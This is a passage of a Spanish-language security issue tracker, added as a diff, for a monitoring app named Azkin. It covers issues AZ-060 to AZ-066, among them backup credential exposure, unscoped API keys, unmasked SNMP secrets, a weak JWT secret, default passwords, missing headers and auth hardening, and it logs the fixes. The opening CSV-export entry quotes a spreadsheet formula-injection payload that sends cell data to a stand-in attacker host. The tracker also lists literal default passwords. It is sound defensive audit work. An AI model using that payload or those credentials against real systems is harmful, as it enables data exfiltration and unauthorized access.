+que contienen `"`, `,` o salto de linea — no neutraliza celdas que empiezan con `=`, `+`, `-` o `@`,
+los prefijos clasicos de inyeccion de formulas reconocidos por Excel/Google Sheets. Los campos
+exportados (`r.monitorName`, `r.target`, `r.msg`) no tienen restriccion de caracteres. Un monitor
+nombrado `=HYPERLINK("http://atacante.example/robar?x="&amp;A1,"abrir")` termina en el CSV exportado
+tal cual, y ejecuta como formula si un Admin lo abre en Excel/Sheets.
+
+### Comportamiento esperado
+
+Un valor de celda que empiece con `= + - @` se neutraliza (prefijo `'` o envoltura equivalente)
+antes de exportar, ademas del escape de comillas/comas ya existente.
+
+### Criterios de aceptacion
+
+1. `escapeCsv()` (y cualquier otro exportador CSV del proyecto) neutraliza el prefijo de formula
+   antes de aplicar el resto del escape.
+
+### Pistas de investigacion
+
+- `frontend/src/app/features/dashboard/dashboard.ts:1508-1524` (`downloadEventsCsv`, `escapeCsv`).
+
+---
+
+## AZ-060) El backup descargable expone los password hash de TODOS los Admins/Viewers y la clave privada TLS a cualquier Admin
+
+- Codigo: AZ-060
+- Estado: [~] Mayormente resuelto (2026-07-27) — documentado; reautenticación y enmascarado deliberadamente diferidos
+- Prioridad: Media
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+Se implementó solo el criterio mínimo: `docs/instalacion-docker.md` §8 ahora documenta
+explícitamente que un backup completo es una "bóveda de credenciales" (password hashes de todos
+los Admin/Viewer + clave privada TLS + secretos de notificación en texto plano) que debe tratarse
+con el mismo cuidado que el acceso a Mongo/`.env`. **Los criterios "deseable" (reautenticación
+antes de crear/descargar) y "enmascarar secretos de notificación en el backup" se dejan
+deliberadamente sin implementar:** un backup completo existe justamente para poder restaurar la
+instancia íntegra tras un desastre — enmascarar los secretos de notificación en el payload
+exportado rompería la restauración real (no habría forma de recuperar el `webhookUrl`/`botToken`
+real), y el "sin aislamiento entre Admins" es una decisión de arquitectura ya documentada del
+proyecto (`spec/03-modelo-datos.md` §8), no un bug de esta issue. Si en el futuro se quiere
+reautenticación antes de descargar, es una mejora acotada e independiente que puede abordarse por
+separado sin tocar el formato del backup.
+
+### Descripcion
+
+`CreateBackupUseCase` (`backend/src/application/use-cases/backup/create-backup.usecase.ts:49-70`)
+empaqueta el `passwordHash` de **todos** los admins y viewers, la clave privada TLS activa
+(`keyPemEncrypted`), y la configuracion de canales de notificacion (sin enmascarar secretos, a
+diferencia de `UpdateNotificationUseCase`) en un solo archivo. `ListBackupsUseCase`/
+`GetBackupUseCase` no aplican ningun filtro de propiedad — cualquier cuenta Admin (incluida una
+creada hace 5 segundos por otro Admin) puede listar y descargar cualquier backup y quedarse con el
+dump completo de hashes de contraseña + material de clave privada de toda la instancia. Es
+consistente con el modelo "sin aislamiento entre Admins" que ya aplica a monitores, pero el radio de
+impacto (credenciales + clave privada de TODA la instancia, no solo "ver un monitor ajeno") es
+categoricamente distinto.
+
+### Comportamiento esperado
+
+Descargar o generar un backup completo (que incluye hashes de contraseña y la clave privada TLS)
+requiere una confirmacion reforzada (reingreso de contraseña) y/o queda documentado como una
+capacidad de alto privilegio para operadores.
+
+### Criterios de aceptacion
+
+1. (Minimo) Documentado explicitamente en `docs/ARCHITECTURE.md`/`instalacion-docker.md` el radio de
+   impacto de un backup para que el operador lo trate como boveda de credenciales.
+2. (Deseable) Reautenticacion (contrasena actual) exigida antes de crear/descargar un backup
+   completo.
+3. Los secretos de canales de notificacion se enmascaran en el backup igual que ya se enmascaran en
+   la API normal (`UpdateNotificationUseCase`), salvo en el campo especifico usado para restaurar.
+
+### Pistas de investigacion
+
+- `backend/src/application/use-cases/backup/{create-backup,get-backup,list-backups}.usecase.ts`
+- `backend/src/infrastructure/http/routes/backup.routes.ts:9-16`
+
+---
+
+## AZ-061) Las API keys son equivalentes a un Admin completo, sin poder acotarlas a monitores o grupos especificos
+
+- Codigo: AZ-061
+- Estado: [~] Mayormente resuelto (2026-07-27) — aviso en UI agregado; scoping por monitor diferido
+- Prioridad: Media
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+Se implementó el criterio mínimo: `api-keys-panel.ts` (`/settings` → **API**) ahora muestra un
+aviso explícito de que una API Key equivale a acceso total de Admin sobre todos los monitores del
+pool, no acotado a un subconjunto. **El criterio "deseable" (acotar una key a monitores/grupos
+específicos) se deja deliberadamente diferido:** requiere agregar un campo nuevo a `IApiKey`, su
+persistencia Mongoose, el schema Zod, *y* nueva lógica de autorización en los use-cases de
+escritura de monitores (`CreateMonitorUseCase`/`UpdateMonitorUseCase`/`DeleteMonitorUseCase`/
+`BulkDeleteMonitorsUseCase`, que hoy no filtran por permiso ni siquiera para Viewers) — una feature
+nueva de tamaño comparable a una issue propia, no un fix acotado.
+
+### Descripcion
+
+`makeApiKeyAuth` (`backend/src/infrastructure/http/middlewares/api-key-auth.ts:35-38`) fija
+`req.userRole = "admin"` y `req.permissions = []` para cualquier API key valida — la unica
+restriccion es el scope grueso `read`/`write` contra el metodo HTTP. `composition-root.ts:659`
+monta `/api/public/v1/monitors` con el **mismo** router que usan los Admins autenticados por sesion,
+asi que una API key "write" puede crear/editar/borrar/borrado-masivo **cualquier** monitor del pool
+global, y una "read" puede listar/exportar todos (incluyendo credenciales SNMP en texto plano, ver
+AZ-062). No existe forma de acotar una API key a un subconjunto de monitores como si se puede con
+los permisos de un Viewer.
+
+### Comportamiento esperado
+
+El panel de creacion de API keys deja claro que una key con scope "write" equivale a acceso total de
+Admin sobre monitores (no acotado), o se agrega la capacidad de acotarla a monitores/grupos
+especificos.
+
+### Criterios de aceptacion
+
+1. (Minimo) La UI de creacion de API keys (`api-keys-panel.ts`) muestra una advertencia explicita de
+   que el scope no esta limitado a monitores propios — es acceso total al pool.
+2. (Deseable) Las API keys admiten una lista opcional de monitores/grupos permitidos, aplicada igual
+   que `filterMonitorsByPermission` para Viewers.
+
+### Pistas de investigacion
+
+- `backend/src/infrastructure/http/middlewares/api-key-auth.ts:35-38`
+- `backend/src/composition-root.ts:659` (montaje de `/api/public/v1/monitors`).
+- `frontend/src/app/features/settings/api-keys-panel.ts` (para el aviso en UI).
+
+---
+
+## AZ-062) Las credenciales SNMP nunca se enmascaran: visibles para Viewers con permiso sobre un solo monitor, y en texto plano en el log de auditoria
+
+- Codigo: AZ-062
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Media
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+`toMonitorResponse()`/`toGroupOverviewResponse()` (`monitor.presenter.ts`) ahora reciben el `role`
+del requester: un Admin sigue viendo `snmpCommunity`/`snmpV3AuthKey`/`snmpV3PrivKey` en texto plano
+(los necesita para editar el monitor), cualquier otro rol los recibe enmascarados vía la
+`maskSecret()` ya existente de `notification-secrets.ts` (constante hermana nueva,
+`SENSITIVE_MONITOR_FIELDS` en `monitor-secrets.ts`). `UpdateMonitorUseCase` enmascara esos mismos
+campos en el diff que escribe en `metadata.changes` del audit log, sin tocar `diffFields` (sigue
+genérico). Cubierto con tests nuevos (`monitor.presenter.test.ts`,
+`update-monitor.usecase.test.ts`).
+
+### Descripcion
+
+Los canales de notificacion tienen un pipeline explicito de enmascarado
+(`SENSITIVE_NOTIFICATION_CONFIG_KEYS`/`maskSecret`) antes de devolverse al cliente o escribirse en
+el diff del log de auditoria. Las credenciales SNMP de un monitor (`snmpCommunity`,
+`snmpV3AuthKey`, `snmpV3PrivKey`) no tienen equivalente: `toMonitorResponse`
+(`backend/src/infrastructure/http/presenters/monitor.presenter.ts:42-50`) las devuelve en texto
+plano en cada `GET /monitors`, incluso a un Viewer acotado a ese monitor especifico; y
+`UpdateMonitorUseCase` (`backend/src/application/use-cases/monitors/update-monitor.usecase.ts:37-43`)
+escribe el valor viejo y nuevo de esas claves, sin enmascarar, directo en `metadata.changes` del
+audit log — que cualquier Admin puede leer via `GET /api/v1/audit-log`, sin relacion con si tiene
+permiso sobre ese monitor.
+
+### Comportamiento esperado
+
+Las credenciales SNMP se enmascaran en las respuestas de API (salvo al propio formulario de edicion,
+igual que notificaciones) y en el log de auditoria, con el mismo criterio que ya existe para
+secretos de canales de notificacion.
+
+### Criterios de aceptacion
+
+1. `toMonitorResponse` enmascara `snmpCommunity`/`snmpV3AuthKey`/`snmpV3PrivKey` salvo en el
+   contexto de edicion del propio monitor por un Admin.
+2. `diffFields` para el audit log de monitores enmascara esos mismos campos antes de persistir el
+   diff.
+
+### Pistas de investigacion
+
+- `backend/src/infrastructure/http/presenters/monitor.presenter.ts:42-50`
+- `backend/src/application/use-cases/monitors/update-monitor.usecase.ts:37-43`
+- `backend/src/application/services/notification-secrets.ts` (patron ya existente para copiar).
+
+---
+
+## AZ-063) `AZKIN_JWT_SECRET` sin longitud minima — de el se deriva ademas la clave de cifrado en reposo de TLS/federacion
+
+- Codigo: AZ-063
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Media
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+`env.ts`: `AZKIN_JWT_SECRET` pasó de `.min(1)` a `.min(32, ...)` con mensaje claro sugiriendo
+`openssl rand -hex 32`. Ambos `.env.example` (raíz y `backend/`) se revisaron/actualizaron para
+seguir cumpliendo el nuevo mínimo (el de `backend/.env.example` era de 24 caracteres y se
+reemplazó por un placeholder más largo).
+
+### Descripcion
+
+`backend/src/infrastructure/config/env.ts:17` — `AZKIN_JWT_SECRET: z.string().min(1, ...)` acepta
+un secreto de 1 caracter. Cuando `AZKIN_TLS_ENCRYPTION_KEY` no esta configurada (el default
+documentado y alentado), `resolve-tls-encryption-key.ts:23-26` deriva la clave AES-256-GCM que
+cifra en reposo las claves privadas TLS y los secretos compartidos de federacion via HKDF-SHA256
+**a partir de este mismo secreto**. La derivacion HKDF en si es solida (verificado: salt vacio
+correcto para IKM con suficiente entropia, info string fija para separacion de dominio, sin reuso),
+pero su seguridad depende enteramente de la entropia de `AZKIN_JWT_SECRET` — un secreto corto/débil
+permite tanto forjar JWT de Admin como, con el mismo dato, recalcular la clave de cifrado y
+descifrar cualquier clave TLS o secreto de federacion exfiltrado.
+
+### Comportamiento esperado
+
+`AZKIN_JWT_SECRET` exige una longitud minima razonable (ej. 32 caracteres) al arrancar.
+
+### Criterios de aceptacion
+
+1. El schema Zod de `env.ts` exige `min(32)` (o equivalente en bits de entropia) para
+   `AZKIN_JWT_SECRET`, con un mensaje de error claro si no se cumple.
+
+### Pistas de investigacion
+
+- `backend/src/infrastructure/config/env.ts:17`
+- `backend/src/infrastructure/config/resolve-tls-encryption-key.ts:23-26` (consumidor de este
+  secreto para la derivacion).
+
+---
+
+## AZ-064) Credenciales por defecto en `.env.example` parecen contraseñas reales, no placeholders obvios, y no hay verificacion al arrancar
+
+- Codigo: AZ-064
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Baja
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+`env.ts` compara al arrancar `AZKIN_MONGO_PASSWORD` (vía `AZKIN_MONGO_URI`, la única forma en que
+el backend la recibe), `AZKIN_FIRST_ADMIN_PASSWORD` y `AZKIN_PROMETHEUS_PASS` contra los 3 valores
+literales exactos de `.env.example`; si alguno coincide, emite un bloque de `console.warn` bien
+visible listando cuáles. Un solo punto de choque (mismo archivo que ya centraliza el warning de
+CORS/Prometheus/bcrypt), en vez de duplicar la comparación en `seed-first-admin.ts`.
+
+### Descripcion
+
+`.env.example`: `AZKIN_MONGO_PASSWORD=CambiarEstaContrasenaDeMongoSegura123!`,
+`AZKIN_FIRST_ADMIN_PASSWORD=CambiarEstaContrasenaSegura123!`,
+`AZKIN_PROMETHEUS_PASS=PrometheusScraperSecurePass123!` — con forma de contraseña real (no un
+placeholder que obviamente falle, como `CHANGE_ME`). `seed-first-admin.ts` siembra el primer Admin
+con lo que sea que tenga `AZKIN_FIRST_ADMIN_PASSWORD` sin comparar contra el valor de ejemplo
+conocido ni forzar cambio en el primer login. Un operador que copia `.env.example` → `.env` para
+"probar rapido" y se olvida de cambiar estos tres valores termina con credenciales adivinables por
+cualquiera que haya visto este repo publico.
+
+### Comportamiento esperado
+
+El primer arranque advierte fuerte (o rechaza arrancar) si alguna de estas credenciales sigue siendo
+exactamente el valor de ejemplo del repo.
+
+### Criterios de aceptacion
+
+1. `seed-first-admin.ts` (u otro punto de arranque) compara el hash de las credenciales configuradas
+   contra los valores conocidos de `.env.example` y emite una advertencia persistente y visible si
+   coinciden.
+
+### Pistas de investigacion
+
+- `.env.example`, `backend/.env.example`
+- `backend/src/infrastructure/config/seed-first-admin.ts`
+
+---
+
+## AZ-065) Sin cabeceras de seguridad (helmet) en el dashboard de administracion; el contenedor backend corre como root
+
+- Codigo: AZ-065
+- Estado: [x] Resuelto (2026-07-27)
+- Prioridad: Baja
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+(1) `composition-root.ts` monta `helmet()` con CSP `default-src 'none'`/`frameAncestors 'none'`
+antes de las rutas (el backend solo sirve JSON, así que una CSP restrictiva no rompe nada).
+`frontend/nginx.conf` agrega `X-Frame-Options DENY`, `X-Content-Type-Options nosniff`,
+`Referrer-Policy` y `Content-Security-Policy: frame-ancestors 'none'` a nivel de `server {}`
+(heredado por todas las `location`). (2) `backend/Dockerfile` (etapa runtime) ahora corre como el
+usuario `node` (uid 1000) ya incluido en `node:24-alpine`, no como root; `compose.yaml`/
+`compose.dev.yaml` agregan `cap_add: [NET_RAW]` al servicio `backend` para que el checker de Ping
+siga abriendo su socket ICMP. **Verificado con Docker real, no solo lectura de código:** se
+construyó la imagen (`docker build`) y se confirmó en un contenedor de prueba que el proceso corre
+como `node` (`whoami`/`id`) y que un `ping` real hacia una IP pública funciona correctamente con
+`--cap-add=NET_RAW`.
+
+### Descripcion
+
+`backend/src/composition-root.ts:214-224` monta `cors`/`express.json`/`cookie-parser`/
+`licenseNotice` pero nunca `helmet()` ni cabeceras manuales — sin `X-Frame-Options`/
+`frame-ancestors`, sin `X-Content-Type-Options: nosniff`, sin CSP, sin HSTS. `frontend/nginx.conf`
+tampoco agrega estas cabeceras. El dashboard de Azkin ejecuta acciones destructivas/de estado
+(borrar monitores, purgar la instancia, revocar API keys) — sin `X-Frame-Options`/`frame-ancestors`
+es plausible un intento de clickjacking contra un Admin autenticado.
+
+Por separado: `backend/Dockerfile` (etapa de runtime) no define un `USER` no-root, asi que el
+proceso Node corre como root dentro del contenedor — el radio de impacto de cualquier RCE futura en
+el proceso queda ampliado innecesariamente.
+
+### Comportamiento esperado
+
+1. El backend agrega cabeceras de seguridad basicas (`helmet()` con `frame-ancestors 'none'`,
+   `nosniff`, CSP base, HSTS cuando corre HTTPS nativo).
+2. El contenedor backend corre como un usuario sin privilegios.
+
+### Criterios de aceptacion
+
+1. `composition-root.ts` monta `helmet()` (o equivalente manual) antes de las rutas.
+2. `backend/Dockerfile` define `USER` no-root antes del `CMD` de la etapa de runtime (usando
+   `cap_add: [NET_RAW]` en compose si el checker de ping lo necesita, en vez de correr todo como
+   root).
+
+### Pistas de investigacion
+
+- `backend/src/composition-root.ts:214-224`
+- `backend/Dockerfile`
+- `frontend/nginx.conf`
+
+---
+
+## AZ-066) Miscelanea de hardening de autenticacion (rate limit compartido, sin bloqueo por intentos fallidos, politica de contraseña debil, y otros gaps menores)
+
+- Codigo: AZ-066
+- Estado: [~] Mayormente resuelto (2026-07-27) — 7 de 8 items resueltos, item 2 diferido
+- Prioridad: Baja
+- Reportado: 2026-07-24
+
+### Progreso (2026-07-27)
+
+1. **Rate limit compartido — resuelto.** `auth.routes.ts` usa ahora una instancia propia de
+   `makeAuthRateLimiter(10, 15)` por endpoint (`/register`, `/login`, `/forgot-password`,
+   `/reset-password`), y se agregó una nueva (`30, 15`) para `/refresh`, que antes no tenía
+   ningún límite.
+2. **Bloqueo de cuenta por intentos fallidos — deliberadamente diferido.** Es una feature nueva
+   (contador por cuenta, política de desbloqueo, posible UI de Admin para desbloquear
+   manualmente, interacción con el `isBlocked` manual ya existente) que amerita su propio diseño,
+   no un fix de una línea. El rate limiter por IP (item 1 + AZ-055) ya cubre el caso de mayor
+   impacto que el propio issue pedía priorizar ("Priorizar 1-2 sobre el resto").
+3. **Política de contraseña — resuelto.** Nuevo `password-policy.ts`
+   (`isPasswordStrong`/`PASSWORD_POLICY_MESSAGE`, mínimo 8 + al menos una letra y un número),
+   reusado en `auth.schema.ts` (`registerSchema`/`resetPasswordSchema`) y en los 3 checks inline de
+   `user.controller.ts` — una sola política en todo el sistema, no 4 implementaciones distintas.
+4. **Warning por `AZKIN_BCRYPT_COST` bajo — resuelto.** `env.ts` advierte si es menor a 10.
+5. **`algorithms` explícito en JWT — resuelto** (junto con AZ-054): `sign()`/`verify()` en
+   `jwt-token-service.ts` fijan `algorithm`/`algorithms: ["HS256"]` explícitamente.
+6. **HTTPS no exigido en federación — resuelto (con advertencia, no bloqueo).** No se bloquea
+   `http://` (AZ-049 slice 3 documenta que la federación soporta HTTP plano deliberadamente).
+   `SetFederationOwnUrlUseCase` ahora loguea un warning si la URL propia normalizada es `http://`
+   fuera de localhost/puertos de desarrollo — el secreto compartido viajaría sin cifrar. No se
+   propagó el mismo aviso al lado que acepta una URL de par ajena durante el enrollment (tocaría
+   más superficie del flujo por un hallazgo de prioridad Baja).
+7. **Inyección de Markdown en Telegram — resuelto.** `renderTemplate()` ganó un `escapeValue`
+   opcional; `sendTelegram()` lo usa para escapar `_ * \` [` en cada valor sustituido, sin tocar el
+   texto fijo de la plantilla.
+8. **Fallback de Socket.IO por query string — resuelto.** Se eliminó la rama `fromQuery` de
+   `extractToken()` en `socketio.gateway.ts` (confirmado que el frontend nunca la usaba).
+
+### Descripcion
+
+Items menores/de endurecimiento encontrados en la misma auditoria, agrupados por ser de bajo impacto
+individual pero faciles de corregir juntos:
+
+1. **Rate limit compartido entre 4 endpoints.** `const strictLimiter = makeAuthRateLimiter(10, 15)`
+   (`auth.routes.ts:12-17`) es una unica instancia reusada para `/register`, `/login`,
+   `/forgot-password` y `/reset-password` — los 4 comparten el mismo cupo de 10 requests/15min por
+   IP, asi que agotar el cupo en uno bloquea a los demas para esa IP.
+2. **Sin bloqueo de cuenta por intentos fallidos.** La unica proteccion contra fuerza bruta es el
+   rate limiter por IP (ver AZ-055) — no hay contador de intentos fallidos por cuenta ni bloqueo
+   progresivo.
+3. **Politica de contraseña minima.** Solo `min(8)`, sin exigir complejidad
+   (`auth.schema.ts:9,21`).
+4. **`AZKIN_BCRYPT_COST` permite bajar hasta 4** (`env.ts:31`) sin ninguna advertencia si un
+   operador lo configura bajo en produccion, a diferencia del aviso que ya existe para CORS.
+5. **`jwt.verify()` no fija `algorithms` explicitamente** (`jwt-token-service.ts:25`) — no es
+   explotable hoy (el secreto es un string plano, `jsonwebtoken` ya restringe a HMAC), pero es
+   defensa en profundidad barata ante un futuro refactor.
+6. **Federacion/URL propia sin exigir HTTPS.** `federation.schema.ts` y `normalize-instance-url.ts`
+   aceptan `http://` sin advertencia — el secreto compartido de federacion viaja en el header
+   `X-Federation-Secret` sin cifrado si el operador configura una URL de par en `http://`.
+7. **Inyeccion de Markdown en Telegram.** `multichannel-notifier.ts:111-133` manda el nombre de
+   monitor con `parse_mode: "Markdown"` sin escapar — un nombre con `_`/`*`/`[texto](url)` puede
+   romper el formato o mostrar un link falso dentro de la alerta.
+8. **Fallback de Socket.IO por query string, sin usar hoy.** `socketio.gateway.ts:71-72` acepta el
+   JWT via `?token=` ademas del handshake `auth:{token}` — el cliente Angular no lo usa
+   (`realtime.service.ts` solo usa `auth:{token}`), pero de usarse algun dia el token quedaria en
+   logs de acceso/historial del navegador (mismo riesgo que `metrics-auth.ts` ya evita a proposito).
+
+### Comportamiento esperado / Criterios de aceptacion
+
+Cada item de la lista se corrige de forma independiente segun su propia descripcion — no hay un
+criterio unico. Priorizar 1-2 (impacto en brute-force) sobre el resto.
+
+### Pistas de investigacion
+
+- `backend/src/infrastructure/http/routes/auth.routes.ts:12-17`
+- `backend/src/infrastructure/http/schemas/auth.schema.ts`
+- `backend/src/infrastructure/config/env.ts:31`
+- `backend/src/infrastructure/security/jwt-token-service.ts:25`
+- `backend/src/infrastructure/http/schemas/federation.schema.ts`,
+  `backend/src/application/services/normalize-instance-url.ts`
+- `backend/src/infrastructure/notifier/multichannel-notifier.ts:111-133`
+- `backend/src/infrastructure/realtime/socketio.gateway.ts:71-72`
